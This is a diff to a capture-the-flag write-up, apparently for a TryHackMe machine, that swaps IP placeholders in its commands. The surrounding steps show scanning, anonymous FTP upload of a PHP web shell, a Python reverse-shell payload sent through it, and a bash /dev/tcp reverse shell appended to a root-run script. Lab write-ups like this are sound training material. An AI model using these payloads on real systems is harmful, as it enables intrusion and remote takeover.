@@ -23,7 +23,7 @@
 > Goal: identify the attack surface of the machine.
 
 ```bash
-nmap -sC -sV -oN scan.txt <IP>
+nmap -sC -sV -oN scan.txt <THM_IP_MACHINE>
 ```
 
 **Open ports found:**
@@ -49,7 +49,7 @@ nmap -sC -sV -oN scan.txt <IP>
 ### FTP — Anonymous Login
 
 ```bash
-ftp <IP>
+ftp <THM_IP_MACHINE>
 # Name: anonymous
 # Password: (empty enter)
 ```
@@ -61,7 +61,7 @@ Files found:
 ### Web
 
 ```bash
-gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<THM_IP_MACHINE> -w /usr/share/wordlists/dirb/common.txt
 ```
 
 **Relevant findings:**
@@ -91,7 +91,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ### Step 2 — Upload via FTP
 
 ```bash
-ftp <IP>
+ftp <THM_IP_MACHINE>
 # Name: anonymous
 cd ftp
 put shell.php
@@ -100,7 +100,7 @@ put shell.php
 ### Step 3 — Verify RCE
 
 ```
-http://<IP>/files/ftp/shell.php?cmd=whoami
+http://<THM_IP_MACHINE>/files/ftp/shell.php?cmd=whoami
 ```
 
 Output: `www-data` ✅
@@ -114,7 +114,7 @@ nc -lvnp 4444
 
 Payload via browser:
 ```
-http://<IP>/files/ftp/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_LINUX(IP)",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+http://<THM_IP_MACHINE>/files/ftp/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_LINUX(IP)",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
 ### Step 5 — Upgrade the shell
@@ -190,7 +190,7 @@ ls -la /etc/print.sh
 Injected reverse shell into the file:
 
 ```bash
-echo "bash -i >& /dev/tcp/YOUR_IP/5555 0>&1" >> /etc/print.sh
+echo "bash -i >& /dev/tcp/<KALI_LINUX_IP>/5555 0>&1" >> /etc/print.sh
 ```
 
 Listener on Kali:
